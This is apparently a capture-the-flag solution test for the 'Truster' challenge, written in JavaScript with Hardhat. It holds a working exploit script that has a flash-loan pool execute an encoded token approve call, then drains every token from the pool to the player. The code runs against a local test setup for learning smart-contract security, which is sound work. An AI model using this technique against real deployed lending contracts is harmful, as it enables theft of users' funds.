const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    pool = await (
      await ethers.getContractFactory("TrusterLenderPool", deployer)
    ).deploy(token.address);
    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  /**
   * @dev
   * Exploit Summary:
   *
   * The lending contract allows executing arbitrary calls to any address
   * during a flash loan. These calls are executed on behalf of the contract,
   * enabling actions such as approving or transferring tokens.
   *
   * In this exploit, we encode the ABI to approve the attacker's wallet to transfer all
   * tokens in the pool using a 0 ether flash loan.
   *
   * After completing the flash loan, the attacker can transfer the approved tokens
   * to their own address.
   *
   * The exploit contract file is located at:
   * "contracts/attacker-contracts/AttackTruster.sol"
   */
  it("Exploit", async function () {
    const AttackTrusterDeployer = await ethers.getContractFactory(
      "AttackTruster",
      player
    );
    const attackContract = await AttackTrusterDeployer.deploy(
      pool.address,
      token.address
    );

    const attackToken = token.connect(player);

    const amount = 0;
    const borrower = player.address;
    const target = token.address;

    // Create the ABI to approve the attacker to spend the tokens in the pool
    const abi = ["function approve(address spender, uint256 amount)"];
    const iface = new ethers.utils.Interface(abi);
    const data = iface.encodeFunctionData("approve", [
      player.address,
      TOKENS_IN_POOL,
    ]);

    await attackContract.attack(amount, borrower, target, data);

    const allowance = await attackToken.allowance(pool.address, player.address);
    const balance = await attackToken.balanceOf(player.address);
    const poolBalance = await attackToken.balanceOf(pool.address);

    console.log("Attacker balance:", balance.toString());
    console.log("Pool balance:", poolBalance.toString());
    console.log("Allowance:", allowance.toString());

    await attackToken.transferFrom(pool.address, player.address, allowance);
  });

  after(async function () {
    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
